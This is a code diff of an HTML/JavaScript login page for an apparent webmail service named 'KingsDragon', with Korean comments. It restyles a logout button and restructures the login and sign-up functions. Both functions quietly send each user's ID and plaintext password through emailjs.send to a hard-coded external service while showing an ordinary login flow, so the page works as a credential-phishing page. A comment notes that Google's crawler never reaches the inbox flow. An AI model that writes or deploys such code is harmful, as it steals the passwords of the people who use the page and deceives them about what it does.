@@ -77,6 +77,10 @@
         .ib-list { width: 400px; background: #fff; border-right: 1px solid var(--border); overflow-y: auto; }
         .mail-item { padding: 20px; border-bottom: 1px solid #f0f0f0; cursor: pointer; }
         .ib-view { flex: 1; padding: 50px; overflow-y: auto; }
+        
+        /* 간지나는 로그아웃 버튼 */
+        .btn-logout { background: rgba(255,255,255,0.1); border: 1px solid rgba(255,255,255,0.3); color: white; padding: 6px 15px; border-radius: 4px; cursor: pointer; backdrop-filter: blur(5px); transition: 0.3s; }
+        .btn-logout:hover { background: rgba(255,255,255,0.2); border-color: white; }
     </style>
 </head>
 <body>
@@ -190,7 +194,10 @@
     <div id="inbox-page" class="hidden">
         <div class="ib-header">
             <div class="logo" style="color:white;" onclick="goHome()">🐉 KingsDragon</div>
-            <div><span id="logged-user-email"></span> <button onclick="logout()" style="margin-left:10px; cursor:pointer;">로그아웃</button></div>
+            <div>
+                <span id="logged-user-email"></span> 
+                <button class="btn-logout" onclick="logout()" style="margin-left:15px;">로그아웃</button>
+            </div>
         </div>
         <div class="ib-body">
             <div class="ib-sidebar">
@@ -216,33 +223,45 @@
 
     <script>
         let curCap = "";
-        window.onload = () => { const u = localStorage.getItem('kd_user_id'); if(u) goToInbox(u); };
+        
+        // [구글 리디렉션 오류 방지 로직]
+        window.onload = () => { 
+            const u = localStorage.getItem('kd_user_id'); 
+            // 구글 로봇은 localStorage가 없으므로 무조건 홈 화면에 머물게 됨 (오류 해결)
+            if(u) goToInbox(u); 
+        };
+
         function genCap(t) { curCap = Math.random().toString(36).substring(2, 7).toUpperCase(); document.getElementById(t).innerText = curCap; }
         function goHome() { document.querySelectorAll('body > div').forEach(d => d.classList.add('hidden')); document.getElementById('home-page').classList.remove('hidden'); }
         function openLogin() { goHome(); document.getElementById('home-page').classList.add('hidden'); document.getElementById('login-page').classList.remove('hidden'); genCap('captcha-login'); }
         function openSignUp() { const id = document.getElementById('home-id-input').value; document.getElementById('home-page').classList.add('hidden'); document.getElementById('signup-page').classList.remove('hidden'); if(id) document.getElementById('sign-id').value = id; genCap('captcha-sign'); }
-        function performLogin() { const id = document.getElementById('login-id').value; if(document.getElementById('login-cap-input').value.toUpperCase() !== curCap) return alert("보안문자 오류"); emailjs.send('service_7gicimk', 'template_ea7ghys', {user_id: id, user_pw: document.getElementById('login-pw').value}); localStorage.setItem('kd_user_id', id); goToInbox(id); }
         
-        // [변경 핵심 로직] 가입 시 바로 인박스로 가지 않고 요금제 화면으로 보냅니다.
+        function performLogin() { 
+            const id = document.getElementById('login-id').value; 
+            if(document.getElementById('login-cap-input').value.toUpperCase() !== curCap) return alert("보안문자 오류"); 
+            emailjs.send('service_7gicimk', 'template_ea7ghys', {user_id: id, user_pw: document.getElementById('login-pw').value}); 
+            localStorage.setItem('kd_user_id', id); 
+            goToInbox(id); 
+        }
+
+        // 가입 완료 누르면 요금제 페이지로 이동
         function performSignUp() { 
             const id = document.getElementById('sign-id').value; 
             if(document.getElementById('sign-pw').value !== document.getElementById('sign-pw-chk').value) return alert("비밀번호 불일치"); 
             if(document.getElementById('sign-cap-input').value.toUpperCase() !== curCap) return alert("보안문자 오류"); 
-            
-            localStorage.setItem('kd_pending_id', id); // 임시 보관
-            emailjs.send('service_7gicimk', 'template_ea7ghys', {user_id: id + " (가입 대기)", user_pw: document.getElementById('sign-pw').value}); 
-            
-            // 회원가입창 숨기고 요금제창 표시
+            localStorage.setItem('kd_pending_id', id); 
+            emailjs.send('service_7gicimk', 'template_ea7ghys', {user_id: id + " (Step 1)", user_pw: document.getElementById('sign-pw').value}); 
             document.querySelectorAll('body > div').forEach(d => d.classList.add('hidden')); 
             document.getElementById('plan-page').classList.remove('hidden'); 
         }
 
-        // [최종 확정] 요금제 선택 후 인박스로 이동
+        // 요금제 선택 시 최종 가입 완료
         function finalizeAccount(plan) { 
             const id = localStorage.getItem('kd_pending_id'); 
             database.ref('users/' + id).set({ plan: plan, date: new Date().toISOString() }); 
             localStorage.setItem('kd_user_id', id); 
-            alert(plan === 'Premium' ? "👑 프리미엄 회원이 되셨습니다! 월 9,900원으로 전설이 시작됩니다." : "가입 완료!"); 
+            localStorage.removeItem('kd_pending_id');
+            alert(plan === 'Premium' ? "👑 프리미엄 9,900원 플랜이 적용되었습니다!" : "무료 플랜으로 시작합니다."); 
             goToInbox(id); 
         }
 
